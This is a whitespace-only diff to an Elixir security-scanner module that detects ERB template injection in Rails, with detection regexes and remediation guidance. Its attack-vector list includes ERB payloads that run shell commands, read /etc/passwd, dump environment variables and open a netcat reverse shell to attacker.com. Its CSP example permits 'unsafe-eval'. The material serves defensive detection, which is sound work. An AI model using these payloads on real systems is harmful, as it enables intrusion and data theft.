@@ -10,7 +10,7 @@ defmodule Rsolv.Security.Patterns.Rails.ErbInjection do
   ## Background
 
   ERB (Embedded Ruby) is the default templating engine in Rails. SSTI occurs when:
-  - User input is directly passed to ERB.new() 
+  - User input is directly passed to ERB.new()
   - User input is used in render inline: calls
   - User input is interpolated into template names
   - ActionView::Template.new() is called with user data
@@ -35,13 +35,13 @@ defmodule Rsolv.Security.Patterns.Rails.ErbInjection do
 
       # Critical - Direct ERB evaluation
       ERB.new(params[:template]).result
-      
-      # Critical - Render inline with user input  
+
+      # Critical - Render inline with user input
       render inline: params[:template]
-      
+
       # Critical - Template name interpolation
       render template: "\#{params[:view]}"
-      
+
       # Safe - Static template with data binding
       render template: "users/show", locals: { data: params[:data] }
   """
@@ -74,7 +74,7 @@ defmodule Rsolv.Security.Patterns.Rails.ErbInjection do
         ~r/render\s+inline:\s*user_\w+/,
         ~r/render\s+:inline\s*=>\s*user_\w+/,
         ~r/render\s+inline:\s*request\.params\[/,
-        # render template with interpolated user input  
+        # render template with interpolated user input
         ~r/render\s+template:\s*["'`][^"'`]*#\{[^}]*params[^}]*\}/,
         ~r/render\s+:template\s*=>\s*["'`][^"'`]*#\{[^}]*params[^}]*\}/,
         # render partial with user input
@@ -129,7 +129,7 @@ defmodule Rsolv.Security.Patterns.Rails.ErbInjection do
       attack_vectors: """
       1. **Direct Code Execution via ERB**: <%= system('whoami') %>
       2. **File System Access**: <%= File.read('/etc/passwd') %>
-      3. **Database Access**: <%= User.all.to_json %> 
+      3. **Database Access**: <%= User.all.to_json %>
       4. **Environment Variable Extraction**: <%= ENV.to_h %>
       5. **Reverse Shell**: <%= IO.popen('nc -e /bin/sh attacker.com 4444') %>
       6. **Process Enumeration**: <%= `ps aux` %>
@@ -140,7 +140,7 @@ defmodule Rsolv.Security.Patterns.Rails.ErbInjection do
       """,
       business_impact: """
       - Complete server and application compromise via remote code execution
-      - Full data breach exposing all customer and business data  
+      - Full data breach exposing all customer and business data
       - Financial losses from fraud and data theft
       - Regulatory fines for data protection violations (GDPR, CCPA, HIPAA)
       - Reputation damage and complete loss of customer trust
@@ -185,7 +185,7 @@ defmodule Rsolv.Security.Patterns.Rails.ErbInjection do
          ERB.new(params[:template]).result        # DANGEROUS
          render inline: params[:template]         # DANGEROUS
          render template: "\#{params[:view]}"     # DANGEROUS
-         
+
          # Always use static templates with data binding
          render template: "users/show", locals: { user_data: params[:data] }  # SAFE
          ```
@@ -194,10 +194,10 @@ defmodule Rsolv.Security.Patterns.Rails.ErbInjection do
          ```ruby
          # Bad - dynamic template names
          render template: params[:template_name]  # VULNERABLE
-         
+
          # Good - whitelist approach
          ALLOWED_TEMPLATES = %w[dashboard profile settings].freeze
-         template_name = ALLOWED_TEMPLATES.include?(params[:template]) ? 
+         template_name = ALLOWED_TEMPLATES.include?(params[:template]) ?
                         params[:template] : 'dashboard'
          render template: "users/\#{template_name}"  # SAFE
          ```
@@ -221,7 +221,7 @@ defmodule Rsolv.Security.Patterns.Rails.ErbInjection do
            return 'index' unless allowed.include?(input)
            input
          end
-         
+
          # Sanitize any dynamic content
          content = ActionController::Base.helpers.sanitize(params[:content])
          ```
@@ -230,11 +230,11 @@ defmodule Rsolv.Security.Patterns.Rails.ErbInjection do
          ```ruby
          # In ApplicationController
          before_action :set_csp_header
-         
+
          private
-         
+
          def set_csp_header
-           response.headers['Content-Security-Policy'] = 
+           response.headers['Content-Security-Policy'] =
              "default-src 'self'; script-src 'self' 'unsafe-eval'"
          end
          ```
@@ -258,7 +258,7 @@ defmodule Rsolv.Security.Patterns.Rails.ErbInjection do
       - Static analysis with Brakeman scanner (detects most ERB injection patterns)
       - Manual code review focusing on all render calls and ERB usage
       - Grep/ripgrep patterns: ERB\\.new.*params, render.*inline.*params, render.*template.*#\\{
-      - Dynamic testing with SSTI payloads: <%= 7*7 %>, <%= "hello".upcase %> 
+      - Dynamic testing with SSTI payloads: <%= 7*7 %>, <%= "hello".upcase %>
       - Web application security scanners (OWASP ZAP, Burp Suite)
       - Penetration testing with template injection fuzzing
       - Runtime application self-protection (RASP) solutions
@@ -278,10 +278,10 @@ defmodule Rsolv.Security.Patterns.Rails.ErbInjection do
       class TemplateSelector
         ALLOWED_TEMPLATES = {
           'dashboard' => 'admin/dashboard',
-          'profile' => 'users/profile', 
+          'profile' => 'users/profile',
           'settings' => 'users/settings'
         }.freeze
-        
+
         def self.safe_template(template_key)
           ALLOWED_TEMPLATES[template_key] || 'errors/not_found'
         end
@@ -307,25 +307,25 @@ defmodule Rsolv.Security.Patterns.Rails.ErbInjection do
           @base_template = validate_template_name(base_template)
           @data = {}
         end
-        
+
         def with_data(key, value)
           @data[key] = sanitize_value(value)
           self
         end
-        
+
         def render
           ApplicationController.renderer.render(
             template: @base_template,
             locals: @data
           )
         end
-        
+
         private
-        
+
         def validate_template_name(template)
           # Strict validation logic
         end
-        
+
         def sanitize_value(value)
           # Sanitization logic
         end
@@ -337,19 +337,19 @@ defmodule Rsolv.Security.Patterns.Rails.ErbInjection do
           @user = user
           @safe_params = sanitize_params(params)
         end
-        
+
         def render
           ApplicationController.renderer.render(
             template: 'users/profile',
-            locals: { 
-              user: @user, 
-              data: @safe_params 
+            locals: {
+              user: @user,
+              data: @safe_params
             }
           )
         end
-        
+
         private
-        
+
         def sanitize_params(params)
           # Comprehensive sanitization
         end
@@ -444,7 +444,7 @@ defmodule Rsolv.Security.Patterns.Rails.ErbInjection do
           trace_variable_flow: true
         },
 
-        # String interpolation detection  
+        # String interpolation detection
         interpolation_detection: %{
           patterns: ["StringInterpolation", "StringConcat"],
           check_for_user_input: true,
